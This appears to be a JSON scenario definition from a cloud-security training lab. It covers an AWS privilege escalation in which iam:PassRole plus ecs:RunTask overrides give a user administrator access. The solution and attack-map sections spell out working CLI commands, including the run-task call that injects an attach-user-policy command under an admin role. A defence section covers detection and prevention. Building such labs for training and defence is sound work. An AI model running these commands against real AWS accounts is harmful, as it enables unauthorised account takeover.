{
  "displayName": "ECS Run Task to Admin",
  "name": "ecs-008-iam-passrole+ecs-runtask",
  "description": "Overriding ECS task definition commands and task role at runtime via ecs:RunTask to escalate to admin without ecs:RegisterTaskDefinition",
  "costEstimate": "$0/mo",
  "pathfindingCloudId": "ecs-008",
  "interactiveDemo": false,
  "supportsOnlineMode": false,
  "category": "Privilege Escalation",
  "subCategory": "new-passrole",
  "pathType": "one-hop",
  "target": "to-admin",
  "environments": [
    "prod"
  ],
  "attackPath": {
    "principals": [],
    "summary": ""
  },
  "mitreAttack": {
    "tactics": [
      "TA0004 - Privilege Escalation",
      "TA0002 - Execution"
    ],
    "techniques": [
      "T1078.004 - Valid Accounts: Cloud Accounts",
      "T1610 - Deploy Container"
    ]
  },
  "terraform": {
    "variableName": "enable_single_account_privesc_one_hop_to_admin_ecs_008_iam_passrole_ecs_runtask",
    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-008-iam-passrole+ecs-runtask"
  },
  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-008-iam-passrole+ecs-runtask",
  "schemaVersion": "4.1.1",
  "permissions": {
    "principals": [
      {
        "name": "pl-prod-ecs-008-to-admin-starting-user",
        "required": [
          {
            "permission": "iam:PassRole",
            "resource": "arn:aws:iam::*:role/pl-prod-ecs-008-to-admin-target-role"
          },
          {
            "permission": "ecs:RunTask",
            "resource": "*",
            "description": "allows launching ECS tasks against any cluster or task definition"
          }
        ],
        "helpful": [
          {
            "permission": "ecs:ListTaskDefinitions",
            "purpose": "discover existing task definitions to exploit"
          },
          {
            "permission": "ecs:DescribeTasks",
            "purpose": "monitor task execution status and verify task completion"
          },
          {
            "permission": "ecs:ListClusters",
            "purpose": "discover available ECS clusters"
          },
          {
            "permission": "ecs:StopTask",
            "purpose": "stop running tasks during cleanup"
          },
          {
            "permission": "ec2:DescribeVpcs",
            "purpose": "find default VPC for Fargate task network configuration"
          },
          {
            "permission": "ec2:DescribeSubnets",
            "purpose": "find subnet in default VPC for Fargate task network configuration"
          },
          {
            "permission": "iam:DetachUserPolicy",
            "purpose": "remove admin policy from starting user during cleanup"
          },
          {
            "permission": "iam:ListAttachedUserPolicies",
            "purpose": "verify privilege escalation success by listing attached policies"
          }
        ]
      }
    ]
  },
  "readme": {
    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-ecs-008-to-admin-starting-user` IAM user to full administrator access by using `ecs:RunTask` with runtime overrides to replace the task role and container command of an existing Fargate task definition, causing the task to execute with the `pl-prod-ecs-008-to-admin-target-role` admin role and attach `AdministratorAccess` to your user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-ecs-008-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-ecs-008-to-admin-target-role`",
    "setup": {
      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
      "deployNonInteractive": "```bash\nplabs enable ecs-008-to-admin\nplabs apply\n```",
      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `ecs-008-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
    },
    "attack": {
      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-ecs-008-to-admin-starting-user` | Scenario-specific starting user with access keys, iam:PassRole, and ecs:RunTask permissions |\n| `arn:aws:iam::{account_id}:role/pl-prod-ecs-008-to-admin-target-role` | Admin role with AdministratorAccess, trusted by ecs-tasks.amazonaws.com |\n| `arn:aws:iam::{account_id}:role/pl-prod-ecs-008-to-admin-execution-role` | ECS task execution role for pulling container images and writing logs |\n| `arn:aws:ecs:{region}:{account_id}:cluster/pl-prod-ecs-008-cluster` | ECS cluster for running Fargate tasks |\n| `arn:aws:ecs:{region}:{account_id}:task-definition/pl-prod-ecs-008-existing-task` | Pre-existing Fargate-compatible task definition (benign, used as override target) |",
      "demoAttack": {
        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation",
        "resourcesCreated": "- AdministratorAccess policy attached to `pl-prod-ecs-008-to-admin-starting-user`",
        "nonInteractive": "```bash\nplabs demo --list\nplabs demo ecs-008-iam-passrole+ecs-runtask\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `ecs-008-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
      },
      "cleanup": {
        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup ecs-008-iam-passrole+ecs-runtask\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `ecs-008-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
      }
    },
    "teardown": {
      "nonInteractive": "```bash\nplabs disable ecs-008-to-admin\nplabs apply\n```",
      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `ecs-008-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
    },
    "defend": {
      "cspm": {
        "whatToDetect": "- IAM user or role has both `iam:PassRole` and `ecs:RunTask` permissions, enabling runtime role override without `ecs:RegisterTaskDefinition`\n- `iam:PassRole` is granted without resource-level restrictions or `iam:PassedToService` conditions, allowing the role to be passed to ECS tasks\n- An IAM principal can pass a role that has `AdministratorAccess` or equivalent broad permissions to ECS task workloads\n- No permission boundary is in place to cap maximum privileges attainable via ECS task execution",
        "prevention": "- Restrict `iam:PassRole` permissions using resource-based conditions to limit which roles can be passed; never allow PassRole to roles with AdministratorAccess\n- Use the `iam:PassedToService` condition key with value `ecs-tasks.amazonaws.com` to control which services can receive passed roles, and pair it with resource ARN restrictions to prevent passing admin roles\n- Implement Service Control Policies (SCPs) that deny `ecs:RunTask` when the `--overrides` parameter specifies a `taskRoleArn` for privileged roles, or deny PassRole to admin roles entirely\n- Consider using a Lambda proxy pattern (as recommended by [the original research](https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path)) to mediate ECS task launches, preventing direct user access to `ecs:RunTask` and enforcing command and role restrictions\n- Use IAM Access Analyzer to identify privilege escalation paths involving `iam:PassRole` combined with `ecs:RunTask`, paying special attention to scenarios that do not require `ecs:RegisterTaskDefinition`\n- Implement IAM permission boundaries on users and roles to cap the maximum permissions that can be attached, limiting the blast radius even if escalation succeeds"
      },
      "cloudSiem": {
        "cloudTrailEvents": "- `IAM: PassRole` -- PassRole to an ECS task role; critical when the target role has elevated permissions\n- `ECS: RunTask` -- ECS task launched; high severity when the `overrides.taskRoleArn` field references a privileged role and no preceding `RegisterTaskDefinition` event is present\n- `IAM: AttachUserPolicy` -- Policy attached to a user; critical when the principal is an ECS task role, indicating runtime privilege escalation from a container workload\n- `IAM: PutUserPolicy` -- Inline policy added to a user; critical when the source principal is an ECS task role",
        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
      }
    },
    "solution": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:RunTask (Command Override)\n\nThis scenario demonstrates a privilege escalation vulnerability where a user with only `iam:PassRole` and `ecs:RunTask` permissions can escalate to administrator access without needing `ecs:RegisterTaskDefinition`. The key insight, [documented by Tom McLean at Reversec Labs](https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path), is that the `ecs:RunTask` API accepts an `--overrides` parameter that allows the caller to override both the container command and the `taskRoleArn` of an existing task definition at runtime. This means an attacker does not need to create or register a new task definition -- they can hijack any existing Fargate-compatible task definition in the account.\n\nBy passing a privileged admin role via the `taskRoleArn` override and injecting an arbitrary command (such as one that attaches AdministratorAccess to the attacker's own user), the attacker can leverage the ECS Fargate platform to execute code with full administrative credentials. The Fargate task runs ephemerally, executes the malicious command, and terminates -- leaving only CloudTrail logs as evidence. Because no new task definition is registered, organizations that monitor only for `ecs:RegisterTaskDefinition` as the escalation indicator will completely miss this attack.\n\nThis is the simplest known ECS-based privilege escalation variant, requiring only two IAM permissions (`iam:PassRole` and `ecs:RunTask`). The reduced permission footprint makes it more likely to appear in real environments where developers or CI/CD pipelines are granted broad ECS task execution permissions alongside PassRole capabilities. It is particularly dangerous because many security tools and IAM policy reviews focus on `ecs:RegisterTaskDefinition` as the prerequisite for ECS-based privilege escalation, overlooking the fact that `ecs:RunTask` alone is sufficient when combined with command and role overrides.\n\n## The Challenge\n\nYou start as `pl-prod-ecs-008-to-admin-starting-user`, an IAM user whose credentials you have obtained. Your goal is to escalate to full administrator access in the AWS account.\n\nYour starting permissions are narrow: `iam:PassRole` on specific ECS-related roles and `ecs:RunTask` on all resources. You also have several helpful read permissions for reconnaissance: `ecs:ListClusters`, `ecs:ListTaskDefinitions`, `ecs:DescribeTasks`, `ec2:DescribeVpcs`, `ec2:DescribeSubnets`, and `iam:ListAttachedUserPolicies`.\n\nThe destination is `pl-prod-ecs-008-to-admin-target-role`, an IAM role with `AdministratorAccess` that trusts `ecs-tasks.amazonaws.com`. You cannot assume this role directly -- but you can make it do work on your behalf.\n\n## Reconnaissance\n\nFirst, let's confirm your identity and verify that you don't already have administrative access:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::<ACCOUNT_ID>:user/pl-prod-ecs-008-to-admin-starting-user\n\naws iam list-users --max-items 1\n# AccessDenied -- as expected\n```\n\nNext, discover what ECS infrastructure is already present in the account:\n\n```bash\naws ecs list-clusters\n# arn:aws:ecs:<REGION>:<ACCOUNT_ID>:cluster/pl-prod-ecs-008-cluster\n\naws ecs list-task-definitions --family-prefix pl-prod-ecs-008-existing-task --status ACTIVE\n# arn:aws:ecs:<REGION>:<ACCOUNT_ID>:task-definition/pl-prod-ecs-008-existing-task:1\n```\n\nThere is an existing cluster and a Fargate-compatible task definition. This is your foothold. You also need network configuration to launch a Fargate task -- find a subnet to use:\n\n```bash\n# Get the default VPC\naws ec2 describe-vpcs --filters \"Name=is-default,Values=true\" --query 'Vpcs[0].VpcId' --output text\n# vpc-xxxxxxxxxxxxxxxxx\n\n# Get a subnet in that VPC\naws ec2 describe-subnets --filters \"Name=vpc-id,Values=vpc-xxxxxxxxxxxxxxxxx\" --query 'Subnets[0].SubnetId' --output text\n# subnet-xxxxxxxxxxxxxxxxx\n```\n\n## Exploitation\n\nHere is where it gets interesting. The `ecs:RunTask` API has an `--overrides` parameter designed to let callers make minor tweaks to a task at launch time -- change an environment variable, adjust a command argument. But it accepts two particularly powerful overrides: `taskRoleArn` (swaps out the entire IAM role the task runs as) and `containerOverrides.command` (replaces the container's entrypoint command entirely).\n\nCombined, these two overrides mean you can take any existing Fargate-compatible task definition and turn it into an arbitrary code execution vehicle running under any role you can pass.\n\nBuild the overrides payload:\n\n```json\n{\n  \"taskRoleArn\": \"arn:aws:iam::<ACCOUNT_ID>:role/pl-prod-ecs-008-to-admin-target-role\",\n  \"containerOverrides\": [\n    {\n      \"name\": \"app\",\n      \"command\": [\n        \"iam\",\n        \"attach-user-policy\",\n        \"--user-name\",\n        \"pl-prod-ecs-008-to-admin-starting-user\",\n        \"--policy-arn\",\n        \"arn:aws:iam::aws:policy/AdministratorAccess\"\n      ]\n    }\n  ]\n}\n```\n\nNow launch the task:\n\n```bash\naws ecs run-task \\\n  --cluster pl-prod-ecs-008-cluster \\\n  --task-definition pl-prod-ecs-008-existing-task \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[subnet-xxxxxxxxxxxxxxxxx],assignPublicIp=ENABLED}\" \\\n  --overrides '{\"taskRoleArn\":\"arn:aws:iam::<ACCOUNT_ID>:role/pl-prod-ecs-008-to-admin-target-role\",\"containerOverrides\":[{\"name\":\"app\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-008-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'\n```\n\nThe ECS control plane validates that you have `iam:PassRole` on the target role, then launches the task. ECS injects temporary credentials for `pl-prod-ecs-008-to-admin-target-role` into the container automatically -- the task container wakes up already authenticated as a full administrator.\n\nThe injected command (`aws iam attach-user-policy ...`) runs with those admin credentials, attaching `AdministratorAccess` to your starting user. The task exits and is gone. No new task definition was registered. From a `RegisterTaskDefinition`-centric detection perspective, nothing happened.\n\nPoll the task status until it stops:\n\n```bash\naws ecs describe-tasks \\\n  --cluster pl-prod-ecs-008-cluster \\\n  --tasks <TASK_ARN> \\\n  --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'\n```\n\nWait for `status: STOPPED` and `exitCode: 0`, then wait 15 seconds for IAM policy propagation.\n\n## Verification\n\nConfirm the `AdministratorAccess` policy was attached to your user:\n\n```bash\naws iam list-attached-user-policies \\\n  --user-name pl-prod-ecs-008-to-admin-starting-user \\\n  --query 'AttachedPolicies[*].PolicyName' \\\n  --output text\n# AdministratorAccess\n```\n\nNow try that privileged operation that failed earlier:\n\n```bash\naws iam list-users --max-items 3\n# Returns a list of IAM users -- full admin access confirmed\n```\n\n## What Happened\n\nYour starting user had two permissions that, in isolation, look benign: the ability to run ECS tasks (a routine operational task) and the ability to pass a role to ECS (also routine). The vulnerability is that `ecs:RunTask` combined with `iam:PassRole` on a privileged role is functionally equivalent to `sts:AssumeRole` -- you get to execute arbitrary code under that role's identity, you just do it inside a container rather than directly.\n\nThe `--overrides` parameter turns the existing benign task definition into a proxy for code execution. No new task definition is needed, no CloudFormation stack, no Lambda function -- just a single API call that launches an ephemeral compute workload with your chosen role and your chosen command.\n\nIn real environments, this pattern appears wherever CI/CD pipelines or developer roles need to launch ECS tasks. PassRole scoped to ECS task roles is common and often granted without careful attention to which roles are in scope. Any developer who can run ECS tasks and pass a sufficiently privileged role to them owns the account.\n"
  },
  "attackMap": {
    "nodes": [
      {
        "id": "starting-principal",
        "label": "Starting User",
        "type": "principal",
        "subType": "iam-user",
        "arn": "arn:aws:iam::{account_id}:user/pl-prod-ecs-008-to-admin-starting-user",
        "access": {
          "type": "assumed-breach-credentials"
        },
        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole and ecs:RunTask permissions, which can be combined to run an ECS Fargate task with a privileged role override and a malicious command override \u2014 without needing ecs:RegisterTaskDefinition.\n"
      },
      {
        "id": "ecs-task",
        "label": "ECS Fargate Task",
        "type": "resource",
        "subType": "ecs-task",
        "arn": "arn:aws:ecs:{region}:{account_id}:task/pl-prod-ecs-008-cluster/*",
        "description": "An ephemeral ECS Fargate task launched using an existing task definition (pl-prod-ecs-008-existing-task) with runtime overrides applied. The task runs with the admin role as its task role and executes the injected command before terminating. It leaves only CloudTrail logs as evidence and never requires a new task definition to be registered.\n"
      },
      {
        "id": "target-role",
        "label": "Admin Task Role",
        "type": "principal",
        "subType": "iam-role",
        "isTarget": true,
        "arn": "arn:aws:iam::{account_id}:role/pl-prod-ecs-008-to-admin-target-role",
        "description": "An IAM role with AdministratorAccess that is trusted by ecs-tasks.amazonaws.com. By passing this role to the ECS task via the taskRoleArn override, the attacker's container workload executes with full administrative credentials. The task assumes this role and uses it to attach AdministratorAccess to the starting user, granting the attacker full administrative control over the AWS account.\n"
      }
    ],
    "edges": [
      {
        "from": "starting-principal",
        "to": "ecs-task",
        "label": "ecs:RunTask + iam:PassRole",
        "description": "The attacker calls ecs:RunTask against the existing task definition, using --overrides to set taskRoleArn to the admin role (requiring iam:PassRole) and to inject a command that attaches AdministratorAccess to the starting user.\n",
        "hints": [
          "You can run ECS tasks and pass roles. Think about what happens when you override both the command and the task role at runtime.",
          "Look at existing task definitions in the account \u2014 you don't need to register a new one.",
          "Use ecs:RunTask with --overrides to set taskRoleArn to an admin role and inject an AWS CLI command that attaches AdministratorAccess to your user.",
          "Browse to https://pathfinding.cloud/paths/ecs-008 for technique details."
        ],
        "commands": [
          {
            "description": "Discover existing ECS clusters",
            "command": "aws ecs list-clusters"
          },
          {
            "description": "Discover existing task definitions",
            "command": "aws ecs list-task-definitions"
          },
          {
            "description": "Find VPC and subnet for Fargate networking",
            "command": "aws ec2 describe-subnets --filters Name=default-for-az,Values=true --query 'Subnets[0].SubnetId' --output text"
          },
          {
            "description": "Run the task with command and role overrides",
            "command": "aws ecs run-task --cluster pl-prod-ecs-008-cluster --task-definition pl-prod-ecs-008-existing-task --launch-type FARGATE --network-configuration 'awsvpcConfiguration={subnets=[<SUBNET_ID>],assignPublicIp=ENABLED}' --overrides '{\"taskRoleArn\":\"arn:aws:iam::<ACCOUNT_ID>:role/pl-prod-ecs-008-to-admin-target-role\",\"containerOverrides\":[{\"name\":\"main\",\"command\":[\"aws\",\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-008-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'"
          }
        ]
      },
      {
        "from": "ecs-task",
        "to": "target-role",
        "label": "assumes role + iam:AttachUserPolicy",
        "description": "The Fargate task assumes the admin role via the taskRoleArn override. The ECS platform injects temporary credentials for this role into the task container automatically. Running as the admin role, the task calls iam:AttachUserPolicy to attach AdministratorAccess to the starting user. After the task completes, the attacker uses their original credentials to verify and exercise full admin access.\n",
        "hints": [
          "Poll the task status using ecs:DescribeTasks until the task reports STOPPED -- this confirms the injected command has finished executing.",
          "Use iam:ListAttachedUserPolicies on your starting user to verify that AdministratorAccess was successfully attached after the task stops.",
          "Wait a few seconds after the task stops before checking IAM -- policy attachments can take a moment to propagate across AWS infrastructure.",
          "Once the policy is attached, confirm admin access by attempting a privileged operation such as listing IAM users -- this should now succeed."
        ],
        "commands": [
          {
            "description": "Verify privilege escalation succeeded",
            "command": "aws iam list-attached-user-policies --user-name pl-prod-ecs-008-to-admin-starting-user"
          },
          {
            "description": "Confirm admin access with a privileged operation",
            "command": "aws iam list-users"
          }
        ]
      }
    ]
  },
  "hasAttackMap": true,
  "slug": "ecs-008",
  "hasDemoTranscript": false
}